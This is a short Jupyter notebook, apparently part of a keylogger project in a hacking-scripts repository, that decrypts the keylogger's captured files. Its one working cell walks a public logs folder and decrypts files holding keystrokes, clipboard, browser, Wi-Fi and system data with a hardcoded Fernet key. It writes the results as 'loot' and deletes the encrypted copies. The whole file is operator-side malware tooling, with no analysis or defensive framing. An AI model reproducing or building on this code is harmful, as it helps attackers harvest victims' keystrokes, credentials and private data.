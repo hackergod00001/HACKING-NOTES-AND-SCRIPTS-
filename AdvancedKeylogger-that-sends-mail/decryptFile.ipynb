{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3fb9bfe4",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys, os, re, pathlib\n",
    "from cryptography.fernet import Fernet\n",
    "import logging\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc6d9ee4",
   "metadata": {},
   "outputs": [],
   "source": [
    "if __name__ == '__main__':\n",
    "    try:\n",
    "        path = 'C:/Users/Public/Logs/'\n",
    "        encrypted_files = [ 'e_network_wifi.txt', 'e_system_info.txt', 'e_clipboard_info.txt', \n",
    "                            'e_browser.txt', 'e_key_logs.txt' ]\n",
    "        regex = re.compile(r'.+\\.xml$')\n",
    "\n",
    "        for dirpath, dirnames, filenames in os.walk(path):\n",
    "            [ encrypted_files.append(file) for file in filenames if regex.match(file) ]\n",
    "\n",
    "        key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='\n",
    "\n",
    "        for file_decrypt in encrypted_files:\n",
    "            with open(path + file_decrypt, 'rb') as x:\n",
    "                data = x.read()\n",
    "            decrypted = Fernet(key).decrypt(data)\n",
    "            with open(path + file_decrypt[2:], 'ab') as loot:\n",
    "                loot.write(decrypted)\n",
    "            os.remove(path + file_decrypt)\n",
    "\n",
    "    except KeyboardInterrupt:\n",
    "        print('* Ctrl + C detected...program exiting *')\n",
    "\n",
    "    except Exception as ex:\n",
    "        logging.exception('* Error Occured: {}*'.format(ex))"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
